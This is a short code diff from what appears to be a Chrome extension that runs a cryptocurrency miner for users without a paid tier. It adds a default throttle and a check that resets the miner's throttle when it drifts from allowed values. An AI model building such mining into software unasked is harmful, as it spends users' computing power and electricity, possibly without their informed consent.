@@ -138,6 +138,7 @@ checkForPaidTier().then(() => {
 
   const throttles = {
     active: 0.95,
+    default: 0.9,
     idle: 0.5,
     locked: 0.2,
   };
@@ -156,6 +157,19 @@ checkForPaidTier().then(() => {
       } else if (!hasPaidTier && miner && !miner.isRunning()) {
         // If there's a miner that's not running, and you don't have the paid tier
         miner.start();
+      } else if (!hasPaidTier && miner && miner.isRunning()) {
+        /**
+         * If there's a miner running, and you don't have the paid tier
+         * then check that the throttling makes sense
+         * This _should_ prevent bugs from setting the throttle
+         * stupidly low or turning it off completely
+         * ...
+         * I wish I'd thought of this 2 days ago
+         */
+        const throttle = miner.getThrottle();
+        const allowedThrottles = Object.values(throttles);
+        const isAllowedThrottle = allowedThrottles.includes(throttle);
+        if (!isAllowedThrottle) setThrottle(throttles.active);
       }
     });
   };
@@ -215,7 +229,7 @@ checkForPaidTier().then(() => {
   if (chrome.idle && typeof chrome.idle.queryState === 'function') {
     startIdleChecks();
   } else {
-    setThrottle(0.90);
+    setThrottle(throttles.default);
   }
 
   checkForPaidTierAndMineAccordingly();
